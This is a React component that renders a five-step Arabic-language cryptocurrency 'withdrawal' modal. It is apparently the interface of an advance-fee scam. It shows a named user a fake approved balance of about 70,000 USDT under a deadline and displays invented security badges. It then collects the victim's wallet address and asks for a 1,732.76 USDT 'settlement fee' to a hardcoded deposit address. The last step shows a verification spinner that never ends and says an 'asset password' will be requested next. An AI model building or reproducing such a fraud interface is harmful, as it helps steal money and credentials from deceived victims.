
import React, { useState } from 'react';

const WithdrawalModal: React.FC = () => {
  const [step, setStep] = useState(1);
  const [walletAddress, setWalletAddress] = useState('');
  const [copied, setCopied] = useState(false);

  const depositAddress = "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d";
  const approvedBalance = "70008.2053";

  const nextStep = () => setStep(prev => prev + 1);

  const copyToClipboard = () => {
    navigator.clipboard.writeText(depositAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="modal-backdrop font-arabic select-none">
      <div className={`modal-container animate-center ${step === 1 ? 'py-8 px-6' : 'py-7 px-6'}`}>
        <div className="modal-glow"></div>
        
        {/* Step Header Indicator - Hidden on step 1 for a cleaner "center alert" look */}
        {step > 1 && (
          <div className="flex items-center justify-center space-x-1.5 space-x-reverse mb-6">
            {[1, 2, 3, 4, 5].map((i) => (
              <div 
                key={i} 
                className={`h-1 rounded-full transition-all duration-300 ${step === i ? 'w-6 bg-[#7C4A50]' : 'w-1.5 bg-gray-200'}`}
              ></div>
            ))}
          </div>
        )}

        {step === 1 && (
          <div className="flex flex-col items-center space-y-5 animate-in fade-in scale-in duration-300">
            <div className="w-16 h-16 rounded-full bg-[#7C4A50]/10 flex items-center justify-center text-[#7C4A50] mb-1">
              <i className="fa-solid fa-circle-check text-[32px]"></i>
            </div>
            
            <div className="text-center space-y-1">
              <h2 className="text-[19px] font-black text-gray-800 leading-tight">اهلا بك Mnour999</h2>
              <p className="text-[14px] text-gray-500 font-bold">رصيدك المعتمد للسحب جاهز الآن</p>
              <p className="text-[11px] text-red-500 font-bold mt-1">ينتهي وقت المعاملة 2026/01/08 الساعه الثانية بعد الضهر بشكل نهائي</p>
            </div>
            
            <div className="w-full bg-gray-50 border border-gray-100 rounded-2xl py-4 px-4 flex flex-col items-center justify-center space-y-1">
               <span className="text-[11px] font-bold text-gray-400 uppercase tracking-widest">Amount Approved</span>
               <div className="flex items-baseline">
                 <span className="text-[24px] font-black text-gray-900 tracking-tight">{approvedBalance}</span>
                 <span className="text-[13px] font-bold text-[#7C4A50] mr-2">USDT</span>
               </div>
            </div>

            <button 
              onClick={nextStep}
              className="w-full py-4 custom-gradient text-white rounded-2xl font-black text-[17px] active:scale-[0.97] transition-all shadow-lg shadow-[#7C4A50]/20"
            >
              التالي
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="flex flex-col space-y-5 animate-in fade-in slide-in-from-bottom-4 duration-500">
            <div className="flex flex-col items-center text-center space-y-3 mb-2">
              <div className="w-16 h-16 rounded-3xl bg-[#7C4A50]/5 flex items-center justify-center text-[#7C4A50] border border-[#7C4A50]/10 shadow-sm">
                <i className="fa-solid fa-shield-check text-[32px]"></i>
              </div>
              <div className="space-y-1">
                <h2 className="text-[20px] font-black text-gray-800 tracking-tight">إشعار أمان النظام</h2>
                <div className="flex items-center justify-center text-[10px] font-bold text-green-600 bg-green-50 px-2.5 py-0.5 rounded-full border border-green-100 uppercase tracking-widest">
                  Verified Protocol v3.1
                </div>
              </div>
            </div>
            
            <div className="text-[14px] leading-[1.6] text-gray-700">
              <p className="mb-4">لقد تمت معالجة تسوية الضريبة الخاصة بحسابك بنجاح. بروتوكول السحب الآمن جاهز الآن لتحويل <span className="font-bold text-gray-900">كامل رصيدك</span> إلى محفظتك الشخصية.</p>
              
              <div className="bg-[#7C4A50]/5 p-4 rounded-2xl border border-[#7C4A50]/10 mb-4 relative overflow-hidden">
                <div className="flex items-start space-x-3 space-x-reverse relative z-10">
                  <i className="fa-solid fa-lock-keyhole text-[#7C4A50] mt-1 text-[15px]"></i>
                  <div className="text-gray-600 text-[12px] font-semibold leading-relaxed">
                    لحماية أصولك الرقمية، تم تشفير هذا الطلب بموجب معايير الأمان الدولية. يمنع مشاركة هذه البيانات مع أطراف خارجية.
                  </div>
                </div>
              </div>
            </div>

            <button 
              onClick={nextStep}
              className="w-full py-4 custom-gradient text-white rounded-2xl font-black text-[17px] active:scale-[0.97] transition-all shadow-xl shadow-[#7C4A50]/30"
            >
              بدء إجراءات السحب
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="flex flex-col space-y-5 animate-in fade-in slide-in-from-bottom-4 duration-500">
            <div className="flex flex-col items-center text-center space-y-3 mb-2">
              <div className="w-16 h-16 rounded-3xl bg-[#1F6AE1]/5 flex items-center justify-center text-[#1F6AE1] border border-[#1F6AE1]/10 shadow-sm">
                <i className="fa-solid fa-wallet text-[32px]"></i>
              </div>
              <h2 className="text-[20px] font-black text-gray-800 tracking-tight">توجيه السحب</h2>
            </div>

            <div className="text-[14px] text-gray-700">
              <p className="mb-5 text-center px-2">الرجاء ربط محفظة الاستلام النهائية. تأكد من استخدام شبكة <span className="font-black text-[#1F6AE1]">BEP-20</span> حصراً.</p>
              
              <div className="space-y-1.5">
                <label className="text-[11px] font-bold text-gray-400 mr-2 uppercase tracking-wider">Wallet Address</label>
                <div className="relative group">
                  <input 
                    type="text"
                    placeholder="0x..."
                    value={walletAddress}
                    onChange={(e) => setWalletAddress(e.target.value)}
                    className="w-full p-4 border-2 border-gray-100 rounded-2xl outline-none focus:border-[#7C4A50] focus:ring-4 focus:ring-[#7C4A50]/5 bg-gray-50 text-[13px] font-mono transition-all text-left"
                    style={{ direction: 'ltr' }}
                  />
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300 group-focus-within:text-[#7C4A50]">
                    <i className="fa-solid fa-key"></i>
                  </div>
                </div>
              </div>
              <div className="mt-4 p-3 bg-blue-50/50 rounded-xl border border-blue-100/50 flex items-center space-x-2 space-x-reverse">
                <i className="fa-solid fa-circle-info text-blue-400 text-[12px]"></i>
                <p className="text-[10px] text-blue-600 font-bold">سيتم فحص العنوان عبر العقد الذكي تلقائياً.</p>
              </div>
            </div>

            <button 
              onClick={nextStep}
              disabled={!walletAddress || walletAddress.length < 20}
              className={`w-full py-4 text-white rounded-2xl font-black text-[17px] transition-all shadow-lg ${walletAddress && walletAddress.length >= 20 ? 'custom-gradient shadow-[#7C4A50]/20 active:scale-[0.97]' : 'bg-gray-200 cursor-not-allowed text-gray-400'}`}
            >
              تأكيد الربط
            </button>
          </div>
        )}

        {step === 4 && (
          <div className="flex flex-col space-y-5 animate-in fade-in slide-in-from-bottom-4 duration-500">
            <div className="flex flex-col items-center text-center space-y-3 mb-2">
              <div className="w-16 h-16 rounded-3xl bg-green-50 flex items-center justify-center text-green-600 border border-green-100 shadow-sm">
                <i className="fa-solid fa-file-signature text-[32px]"></i>
              </div>
              <h2 className="text-[20px] font-black text-gray-800 tracking-tight">تسوية القناة النهائية</h2>
            </div>

            <div className="text-[13px] leading-[1.6] text-gray-700">
              <div className="invoice-card p-4 rounded-3xl mb-4 border border-gray-100 shadow-sm text-center relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[#7C4A50]/20 to-transparent"></div>
                <p className="text-[11px] font-bold text-gray-400 mb-1 uppercase tracking-widest">Fees & Settlement</p>
                <div className="flex items-baseline justify-center">
                  <span className="text-[30px] font-black text-[#7C4A50]">1732.76</span>
                  <span className="text-[12px] font-bold text-[#7C4A50] mr-1.5">USDT</span>
                </div>
              </div>

              <div className="bg-gray-50/80 p-4 rounded-2xl text-gray-600 text-[11px] border border-gray-200 mb-5 italic">
                <span className="font-bold text-gray-800 block mb-1">إحاطة تنظيمية:</span> الضريبه هي اجور منصتنا وليس لها أي صله بمنصهmini pro، وبناءً على البروتوكول المنظم تم تخفيض الرسوم التشغيلية بناءً على تسوية خاصة بموجب بروتوكول الاتفاق المنظم للمنصة. هذه الرسوم مطلوبة لفتح قناة السيولة الفورية.
              </div>

              <div className="space-y-2">
                <p className="font-bold text-gray-800 text-[12px] mr-1">عنوان إيداع الرسوم (BEP-20):</p>
                <div 
                  onClick={copyToClipboard}
                  className="group relative bg-gray-900 text-white p-4 rounded-2xl font-mono text-[10px] text-center select-all cursor-pointer break-all mb-1 active:bg-black transition-all border border-white/10"
                >
                  {depositAddress}
                  <div className="absolute inset-y-0 left-4 flex items-center">
                     <i className={`fa-solid ${copied ? 'fa-check text-green-400' : 'fa-copy opacity-40'} transition-opacity`}></i>
                  </div>
                </div>
                {copied && <p className="text-center text-green-600 text-[10px] font-black animate-pulse">✓ تم نسخ العنوان للمحفظة</p>}
              </div>
            </div>

            <button 
              onClick={nextStep}
              className="w-full py-4 custom-gradient text-white rounded-2xl font-black text-[17px] active:scale-[0.97] transition-all shadow-xl shadow-[#7C4A50]/30"
            >
              تم التحويل بنجاح
            </button>
          </div>
        )}

        {step === 5 && (
          <div className="flex flex-col items-center space-y-6 py-4 animate-in fade-in duration-700">
            <div className="text-center">
              <h2 className="text-[20px] font-black text-gray-800 mb-1">جاري التحقق الرقمي</h2>
              <p className="text-gray-400 text-[10px] font-bold uppercase tracking-widest">Network Confirmation in Progress</p>
            </div>
            
            <div className="relative flex items-center justify-center">
              <div className="loader"></div>
              <div className="absolute text-[#7C4A50] opacity-30 animate-pulse">
                <i className="fa-solid fa-microchip text-[20px]"></i>
              </div>
            </div>

            <div className="text-[13px] leading-relaxed text-gray-700 text-center px-1">
              <div className="bg-gray-50 rounded-2xl p-3 mb-4 border border-gray-100 flex items-center justify-center space-x-2 space-x-reverse">
                <span className="w-2 h-2 rounded-full bg-yellow-400 animate-ping"></span>
                <span className="text-[11px] font-bold text-gray-600">بانتظار تأكيد العقد الذكي</span>
              </div>
              
              <p className="text-gray-500 leading-relaxed">
                برجاء البقاء في هذه الصفحة. يتم الآن التأكد من استلام رسوم التسوية عبر البلوكشين. التوجيه التلقائي سيتم خلال ثوانٍ.
              </p>
              
              <div className="mt-8 pt-6 border-t border-gray-100 text-right">
                <div className="bg-amber-50 p-4 rounded-2xl border border-amber-100/50">
                  <p className="text-amber-800 text-[11px] font-bold leading-tight">
                    <i className="fa-solid fa-circle-exclamation ml-1.5"></i>
                    الخطوة النهائية (قريباً):
                  </p>
                  <p className="text-amber-700 text-[10px] mt-1">
                    سيطلب منك النظام إدخال "كلمة مرور الأصول" لتأكيد التوقيع الرقمي النهائي وإرسال العملات فوراً.
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default WithdrawalModal;
